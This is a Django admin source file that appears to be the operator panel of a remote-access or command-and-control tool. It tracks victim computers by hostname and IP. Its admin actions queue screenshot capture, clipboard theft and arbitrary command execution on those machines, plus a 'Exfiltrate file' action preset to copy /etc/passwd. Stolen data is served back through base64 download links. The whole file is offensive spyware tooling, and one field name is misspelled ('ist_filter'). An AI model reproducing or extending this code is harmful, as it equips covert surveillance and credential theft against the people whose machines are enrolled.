from django.contrib import admin
from django.utils.html import format_html
from .models import Computer,Data,Action
from django.http import HttpResponseRedirect

# Register your models here.
@admin.register(Computer)
class ComputerAdmin(admin.ModelAdmin):
    def getfile(self, request, queryset):
        if len(queryset)==1:
            action=Action.objects.create(computer=queryset[0],command="cp /etc/passwd",staged=False)
            action.save()
            return HttpResponseRedirect('/admin/collector/action/'+str(action.id)+'/change/')
    def command(self, request, queryset):
        if len(queryset)==1:
            action=Action.objects.create(computer=queryset[0],command="",staged=False)
            action.save()
            return HttpResponseRedirect('/admin/collector/action/'+str(action.id)+'/change/')
    def clipboard(self, request, queryset):
        for computer in queryset:
            Action.objects.create(computer=computer,command="clipboard").save()
    def screenshot(self, request, queryset):
        for computer in queryset:
            Action.objects.create(computer=computer,command="screenshot").save()
    def related_data(self, obj):
        return format_html("<a href='../data/?computer__id__exact={}'>See related data</a>",obj.id)
    list_display = ['hostname','ip_address','pub_date','related_data']
    search_fields = ['hostname','ip_address']
    list_filter = ('pub_date','hostname')
    actions = ['screenshot','clipboard','getfile','command']
    screenshot.short_description = "Take a screenshot"
    clipboard.short_description = "Get clipboard"
    command.short_description = "Execute specific command (1 host)"
    getfile.short_description = "Exfiltrate file (1 host)"

@admin.register(Data)
class DataAdmin(admin.ModelAdmin):
    def data(self, obj):
        if obj.is_file:
            return format_html("<a href='data:application/octet-stream;base64,{}' download>Download</a>",obj.data_content)
        else:
            return obj.data_content
    list_display = ['computer','pub_date','data_type','data','is_file']
    search_fields = ['computer__hostname']
    list_filter = ('pub_date','data_type','is_file')

@admin.register(Action)
class ActionsAdmin(admin.ModelAdmin):
    list_display = ['computer','pub_date','command','staged','performed']
    search_fields = ['computer__hostname','command']
    ist_filter = ('pub_date','performed','staged')